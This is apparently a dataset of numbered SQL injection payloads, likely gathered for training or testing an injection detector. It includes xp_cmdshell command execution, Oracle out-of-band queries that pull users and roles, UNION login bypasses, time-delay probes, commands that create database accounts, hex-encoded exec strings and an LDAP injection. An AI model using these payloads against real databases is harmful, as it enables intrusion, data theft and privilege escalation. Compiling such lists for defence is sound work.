10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
61  or 'something'   =   'some'+'thing' 
101 1 where 2060  =  2060 
133  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i 
171  or userid like '% 
182 -- &password  =  
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
256 select * from information_schema.tables-- 
346 1%" and 2805  =  1345 
382  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i 
388 -4494 or 5291  =  4452 
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
499 or 'something'   =   'some'+'thing' 
503 -8633" or 5099  =  5974 
508  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i 
540 1 uni/**/on select all from where 
555 create user name identified by 'pass123' 
693 waitfor delay '0:0:5' and 'gsvt'  =  'gsvt 
710 ns 
758 \x27UNION SELECT 
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
935  or uname like '% 
984 make_set  (  5679  =  9769,9769  )   
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1094 ^' 
